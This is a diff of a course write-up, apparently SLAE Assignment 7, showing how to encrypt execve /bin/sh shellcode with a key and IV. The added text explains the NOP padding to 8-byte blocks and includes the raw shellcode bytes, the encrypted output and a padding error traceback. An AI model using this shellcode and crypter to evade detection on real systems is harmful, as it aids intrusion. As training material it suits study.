@@ -53,7 +53,7 @@ print '"' + crypted + '"'
 As you can see, the shellcode must be printed and piped as an argument. Furthermore, the key and the IV must be parsed as arguments as well. In addition, the IV number should be 
 specifically 8, as IV takes an 8 byte binary argument in such cryption schema.
 
-Let's encode some execve shellcode that executes /bin/sh. The key will be '@-YEYCoy#86s+qXIngZwHe8X8tl4-59ADmJQ' and the IV 'ZYf3J4hM'
+Let's encode some execve shellcode that executes /bin/sh. The key will be '@-YEYCoy#86s+qXIngZwHe8X8tl4-59ADmJQ' and the IV 'ZYf3J4hM'. Furthermore, it is essential to note that the shellcode has to be divisible by 8. Due to this, the chosen shellcode has been parsed with a few nops. The original size was 22, it should be now 24.
 
 ```term
 whitecr0wz@SLAE:~/assembly/assignments/Assignment_7$ python encrypt.py 
@@ -62,6 +62,19 @@ whitecr0wz@SLAE:~/assembly/assignments/Assignment_7$ python encrypt.py
 whitecr0wz@SLAE:~/assembly/assignments/Assignment_7$ 
 whitecr0wz@SLAE:~/assembly/assignments/Assignment_7$ echo -ne "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\xb0\x0b\xcd\x80\x90\x90" | python encrypt.py @-YEYCoy#86s+qXIngZwHe8X8tl4-59ADmJQ ZYf3J4hM 
 "\x24\x5c\xc5\x8c\x39\x23\x01\x95\xfd\x4c\x76\x81\x92\xb4\x97\x18\x94\xb7\xf1\x4e\x7e\xb2\xd3\x42"
+whitecr0wz@SLAE:~/assembly/assignments/Assignment_7$
+```
+
+With no NOPS, the following error is given:
+
+```term
+whitecr0wz@SLAE:~/assembly/assignments/Assignment_7$ echo -ne "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\xb0\x0b\xcd\x80" | python encrypt.py @-YEYCoy#86s+qXIngZwHe8X8tl4-59ADmJQ ZYf3J4hM 
+Traceback (most recent call last):
+  File "encrypt.py", line 15, in <module>
+    ciphertext = obj.encrypt(message)
+  File "/usr/lib/python2.7/dist-packages/Crypto/Cipher/blockalgo.py", line 244, in encrypt
+    return self._cipher.encrypt(plaintext)
+ValueError: Input strings must be a multiple of 8 in length
 whitecr0wz@SLAE:~/assembly/assignments/Assignment_7$
 ```
 
